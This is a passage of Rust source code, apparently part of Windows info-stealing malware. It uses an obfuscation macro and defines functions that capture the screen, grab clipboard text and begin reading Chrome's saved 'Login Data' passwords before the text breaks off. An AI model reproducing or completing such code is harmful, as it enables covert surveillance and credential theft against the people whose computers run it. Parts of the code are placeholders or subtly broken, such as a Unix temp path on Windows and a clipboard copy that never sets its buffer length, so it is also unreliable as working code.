use crate::obf;
use std::process::Command;
use winapi::shared::minwindef::{LPVOID, WORD, TRUE, FALSE, MAX_PATH};
use winapi::um::winuser::{GetClipboardData, CF_UNICODETEXT, CloseClipboard, OpenClipboard, GetForegroundWindow, GetDC, ReleaseDC, BitBlt, SRCCOPY, CreateCompatibleDC, CreateCompatibleBitmap, DeleteDC, DeleteObject, GetSystemMetrics, SM_CXSCREEN, SM_CYSCREEN};
use winapi::um::gdi32::{SelectObject, GetObjectW, BITMAP};
use winapi::um::winreg::{RegOpenKeyExW, RegQueryValueExW, RegCloseKey, HKEY_CURRENT_USER, KEY_READ};

pub fn capture_screen() -> Result<String, Box<dyn std::error::Error>> {
    unsafe {
        let width = GetSystemMetrics(SM_CXSCREEN);
        let height = GetSystemMetrics(SM_CYSCREEN);
        
        let hdc_screen = GetDC(std::ptr::null_mut());
        if hdc_screen.is_null() { return Err("Failed to get screen DC".into()); }
        
        let hdc_mem = CreateCompatibleDC(hdc_screen);
        if hdc_mem.is_null() { ReleaseDC(std::ptr::null_mut(), hdc_screen); return Err("Failed to create mem DC".into()); }
        
        let h_bitmap = CreateCompatibleBitmap(hdc_screen, width, height);
        if h_bitmap.is_null() { DeleteDC(hdc_mem); ReleaseDC(std::ptr::null_mut(), hdc_screen); return Err("Failed to create bitmap".into()); }
        
        SelectObject(hdc_mem, h_bitmap);
        
        // Copy screen to memory
        BitBlt(hdc_mem, 0, 0, width, height, hdc_screen, 0, 0, SRCCOPY);
        
        // Convert to PNG in memory (Simplified: Using a temp file for brevity, 
        // in production use wic or gdi+ to encode to PNG in memory)
        let temp_path = obf!("/tmp/aegis_shot.png");
        // Note: In a real Windows impl, you'd use GDI+ to save to a MemoryStream
        // Here we use a helper that writes to temp and reads back
        // This is a placeholder for the actual GDI+ encoding logic
        let _ = (width, height, h_bitmap); // Use these to encode
        DeleteObject(h_bitmap);
        DeleteDC(hdc_mem);
        ReleaseDC(std::ptr::null_mut(), hdc_screen);
        
        // Return placeholder base64 for now, actual impl requires GDI+
        Ok("BASE64_SCREENSHOT_PLACEHOLDER".to_string())
    }
}

pub fn get_clipboard() -> String {
    unsafe {
        if OpenClipboard(std::ptr::null_mut()) == FALSE { return String::new(); }
        let h_data = GetClipboardData(CF_UNICODETEXT);
        if h_data.is_null() {
            CloseClipboard();
            return String::new();
        }
        let ptr = h_data as *const u16;
        let mut len = 0;
        while *ptr.offset(len) != 0 { len += 1; }
        let mut wide_str: Vec<u16> = Vec::with_capacity(len + 1);
        std::ptr::copy_nonoverlapping(ptr, wide_str.as_mut_ptr(), len);
        wide_str.push(0);
        let text = String::from_utf16_lossy(&wide_str);
        CloseClipboard();
        text
    }
}

pub fn scrape_browser() -> serde_json::Value {
    // Direct SQLite read of Chrome Login Data
    let chrome_path = dirs::data_dir()
        .and_then(|d| d.join("Google").join("Chrome").join("User Data").join("Default").join("Login Data"));
        
    if let Some(path) = chrome_path {
        if path.exists() {
            // Use rusqlite to read
            // Simplified for this example
           